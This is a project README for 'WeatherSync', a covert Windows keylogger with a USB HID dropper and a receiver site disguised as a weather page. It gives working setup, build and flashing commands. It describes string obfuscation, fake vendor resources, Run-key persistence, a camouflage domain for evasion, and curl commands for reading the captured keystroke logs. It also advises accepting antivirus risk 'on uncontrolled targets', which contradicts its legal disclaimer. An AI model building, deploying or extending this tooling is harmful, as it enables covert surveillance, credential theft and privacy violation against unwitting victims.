# WeatherSync — Windows keylogger, weather-app receiver, USB dropper

> **Legal use:** deploy this only on computers you own or are authorized to
> monitor (your machines, your minor children, or employees with written
> notice). Using it on another adult's machine without consent is illegal in
> most jurisdictions, including under the US federal Wiretap Act and CFAA.
> See `legal.md` for the full US-focused analysis.

A three-module hobby/educational project:

1. **`keylogger/`** — a C (MinGW-w64) Windows keylogger. Captures keystrokes
   through a low-level keyboard hook, buffers them **in memory only**, and
   uploads AES-256-GCM-encrypted batches over HTTPS on a jittered schedule.
   No disk writes (the only mutation is the HKCU Run key used for
   persistence). Compiled natively and string-obfuscated, so it is not
   decompilable and leaks no plaintext config in `strings`.
2. **`keylogger/build.py`** — the obfuscator/build driver: XOR-masks every
   sensitive string into `gen_strings.h` with per-build random keys, stamps
   fake version resources ("WeatherSync Service", Northlane Digital),
   compiles with symbols stripped, and self-checks the exe for leaks.
3. **`usb/dropper/dropper.ino`** — an Arduino Pro Micro sketch that types a
   PowerShell one-liner via Win+R to download, unblock, install, persist,
   and start the payload. Plain USB sticks cannot auto-execute on Windows
   10/11, so a ~$5 HID board does the injection.
4. **`receiver/`** — a Next.js app on Vercel posing as a plain weather page
   (real Open-Meteo data). `POST /api/sync` verifies and ingests encrypted
   batches, stored **encrypted at rest** in Vercel Blob; `GET /api/logs`
   (Bearer-token header) decrypts them on demand; `/payload.exe` is
   served as a static asset for the dropper.

Full design details: `design.md`. Legal analysis (US): `legal.md`.

## Setup

### Receiver (Vercel)

```
cd receiver
npm install
npx vercel link                            # team/scope the project lives in
npx vercel blob create-store <name> --access public   # sets BLOB_READ_WRITE_TOKEN
npx vercel env add KEYLOGGER_PSK           # 64 hex chars printed by build.py
npx vercel env add LOGS_TOKEN              # any long random string
```

Deployments are CI/CD-driven: the GitHub repo is connected to the Vercel
project (root directory `receiver/`), so **`git push` builds production** —
don't use `npx vercel --prod`, which conflicts with the root-directory setting.

Without `BLOB_READ_WRITE_TOKEN` (e.g. local `npm run dev`), batches are kept
in an in-memory fallback store. Recommended: point a boring, weather-ish
custom domain at the project — it completes the camouflage in browser
history and TLS SNI.

### Keylogger build

Requires MSYS2 MinGW-w64 (`gcc`, `windres`) on PATH and Python 3.10+.

```
cd keylogger
python build.py            # uses/creates config.json; prints a new PSK once
```

`config.json` (gitignored) holds the endpoint, PSK, and fake product
identity; `config.example.json` is the committed template. The default
example targets `http://localhost:3000` (`allow_http_local`) for local
testing; for production set `endpoint_host` to the real domain and
`allow_http_local` to `false`.

### USB dropper

1. Edit `#define HOST` in `usb/dropper/dropper.ino` to the receiver domain.
2. Flash a Pro Micro:
   ```
   arduino-cli core install arduino:avr
   arduino-cli compile --fqbn arduino:avr:micro usb/dropper
   arduino-cli upload  --fqbn arduino:avr:micro -p COMx usb/dropper
   ```
3. Plug it into an **unlocked** target. In ~10–15 s it installs and starts
   the service; nothing incriminating ever lives on the USB stick.

## Operator usage

Batches are stored **encrypted at rest** (the AES-GCM envelope, exactly as uploaded); plaintext is only produced on demand by the viewer. The logs token is sent as a header — never a query string — so it stays out of access logs and browser history:

```bash
DOMAIN=https://<your-deployed-domain>               # your deployed domain
TOKEN=$(cat .vercel-logs-token.txt)                 # production LOGS_TOKEN

# list the latest 200 batches
curl -H "Authorization: Bearer $TOKEN" "$DOMAIN/api/logs"

# read one batch (decrypts on demand)
curl -H "Authorization: Bearer $TOKEN" "$DOMAIN/api/logs?full=1&pathname=batches/<ts>-<deviceid>-<rand>.txt"

# health check
curl "$DOMAIN/api/health"
```

Without a `BLOB_READ_WRITE_TOKEN` (local `npm run dev`), batches are kept in an in-memory fallback store instead of Vercel Blob.

## Verification checklist (run on your own machine)

- After ~3 min of typing, `/api/logs` shows a batch; text and window titles
  match what was typed.
- ProcMon: zero file writes in steady state, exactly one `RegSetValue`,
  and the one-time self-copy to `%APPDATA%\Northlane` on first run.
- Sysinternals `strings` on the exe: no domain, PSK, or company name
  (build.py self-checks this on every build).
- Wireshark: all traffic TCP/443, SNI = the receiver domain, no cleartext.
- `objdump -h` on the exe: no COFF symbol table.
- Reboot the test machine: the process returns (Run key persistence).

## Tests

```
python tests/run_all.py
```

Runs both suites (needs MSYS2 `gcc` and Node 24+ on PATH; a missing tool skips
that suite rather than failing):

- **`tests/keylogger/test_native.c`** — the implant's core (`buffer.c`,
  `util.c`, `crypto.c`): base64 RFC vectors, wide↔UTF-8 roundtrips, buffer
  eviction/flush-gate/serialization invariants, device-id stability, and the
  AES-256-GCM seal decrypted back through BCrypt with tamper/wrong-AAD/wrong-
  key rejection.
- **`tests/receiver/`** — unit tests for the envelope validator/decryptor
  plus an integration suite that boots `next dev` (test PSK + token,
  in-memory store, port 3999) and exercises the real HTTP surface: sync
  400/401/200 paths, logs Bearer-header auth (query-string tokens rejected),
  listing, and on-demand decrypt.

Details: `tests/README.md`. The live-keyboard parts (hook, window titles,
persistence) stay manual — see the checklist above.

## Risks

- Windows Defender may flag the profile (unsigned exe + download + HKCU Run
  key + PowerShell one-liner is the classic dropper fingerprint). On your
  own machines, submit a false positive; on uncontrolled targets, accept
  the residual risk.
- Non-US keyboard layouts can mistype the dropper one-liner's punctuation;
  test on the target's layout or switch to a `curl.exe` variant.
